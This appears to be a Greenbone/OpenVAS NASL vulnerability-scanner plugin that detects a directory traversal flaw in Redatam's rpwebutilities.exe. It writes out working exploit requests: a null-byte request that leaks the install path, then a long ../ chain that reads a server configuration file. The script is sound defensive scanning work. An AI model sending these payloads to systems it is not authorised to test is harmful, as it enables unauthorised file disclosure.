CPE = "cpe:/a:redatam:redatam";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141197" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2018-06-19 13:19:44 +0700 (Tue, 19 Jun 2018)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Redatam Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_redatam_detect.sc" );
	script_mandatory_keys( "redatam/installed" );
	script_tag( name: "summary", value: "Redatam is prone to a directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "solution", value: "Update to version 7 or later." );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/44905/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
req = http_get( port: port, item: "/redbin/rpwebutilities.exe/text?LFN=dfasff%00.htm&TYPE=TMP" );
res = http_keepalive_send_recv( port: port, data: req );
path = eregmatch( pattern: "File not found in folder \\[[^\\]+([^]]+)", string: res );
if(isnull( path[1] )){
	exit( 0 );
}
path = str_replace( string: path[1], find: "\\", replace: "/" );
url = "/redbin/rpwebutilities.exe/text?LFN=../../../../../../../../../../../../../../../.." + path + "prt/webservermain.inl%00.htm&TYPE=TMP";
if(http_vuln_check( port: port, url: url, pattern: "PORTALTITLE=", check_header: TRUE, debug: FALSE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

